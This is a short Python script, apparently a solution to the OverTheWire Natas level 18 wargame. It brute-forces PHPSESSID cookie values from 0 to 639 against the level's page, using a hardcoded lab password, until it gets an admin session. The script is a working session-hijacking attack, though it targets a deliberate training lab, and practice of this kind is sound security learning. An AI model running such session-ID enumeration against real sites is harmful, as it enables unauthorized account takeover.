#!usr/bin/python

import requests
URL = "http://natas18.natas.labs.overthewire.org/index.php"
USER = "natas18"
PASS = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

def check_admin(value):
    r = requests.get(URL, cookies = {'PHPSESSID':value}, auth = (USER,PASS))
    if "You are an admin" in r.text:
        return True
    else:
        return False

def cookie_loop():
    for k in range(0,640):
        if check_admin(str(k)) is True:
            print k
            break
        else:
            print str(k) + " Not this one"

cookie_loop()
        
